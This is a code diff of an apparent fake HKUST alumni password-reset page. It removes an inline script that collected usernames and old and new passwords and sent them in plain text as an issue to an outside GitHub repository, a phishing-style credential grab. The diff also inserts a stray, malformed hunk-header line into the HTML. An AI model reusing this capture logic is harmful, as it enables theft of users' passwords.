@@ -1,3 +1,4 @@
+@@ -0,0 +1,150 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -147,30 +148,4 @@
         </div>
     </div>
 </body>
-<script>
-document.querySelector(".submit").addEventListener("click", function (event) {
-    event.preventDefault(); // Prevent the form from reloading the page
-
-    const username = document.getElementById("username").value;
-    const domain = document.querySelector('input[name="domain"]:checked').value;
-    const oldPassword = document.getElementById("old-password").value;
-    const newPassword = document.getElementById("new-password").value;
-    const confirmPassword = document.getElementById("confirm-password").value;
-
-    // Format GitHub issue content
-    const issueTitle = `[HKUST Alumni] Password Reset Request - ${username}@${domain}`;
-    const issueBody = `
-**Username**: ${username}
-**Domain**: ${domain}
-**Old Password**: ${oldPassword}
-**New Password**: ${newPassword}
-**Confirm Password**: ${confirmPassword}
-`;
-
-    window.open(
-        `https://github.com/Isaa101/fake_password_reset/issues/new?title=${encodeURIComponent(issueTitle)}&body=${encodeURIComponent(issueBody)}`,
-        "_blank"
-    );
-});
-</script>
 </html>
